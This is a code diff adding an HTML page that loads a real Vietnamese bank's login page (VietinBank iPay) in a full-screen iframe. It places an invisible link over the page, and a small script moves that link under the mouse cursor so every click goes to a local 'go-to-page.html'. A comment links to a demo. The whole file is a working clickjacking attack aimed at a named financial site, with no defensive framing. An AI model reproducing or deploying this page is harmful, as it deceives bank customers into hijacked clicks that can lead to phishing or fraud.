@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+</head>
+<style>
+  body {
+    margin: 0;
+  }
+
+
+  iframe {
+    border: none;
+    position: absolute;
+    width: 100%;
+    height: 100vh;
+  }
+
+  #hiden-overplay {
+    color: transparent;
+    position: absolute;
+    width: 100%;
+    height: 100%;
+    border: none;
+  }
+
+  a {
+    color: transparent;
+    display: block;
+    width: 100%;
+    height: 100%;
+    cursor: default;
+  }
+
+</style>
+<!-- demo: https://imgur.com/a/jsYReD8 -->
+<body style="overflow: inherit;">
+
+  <iframe class="content-web" src="https://ipay.vietinbank.vn/login"></iframe>
+  <div id="hiden-overplay">
+    <a href="./go-to-page.html">adad</a>
+  </div>
+
+  <script type="text/javascript">
+    window.onmousemove = function (e){
+      var m = document.getElementById("hiden-overplay")
+      m.style.left= e.clientX -30 +'px'
+      m.style.top = e.clientY - 30 + 'px'
+    }
+  </script>
+</body>
+
+</html>
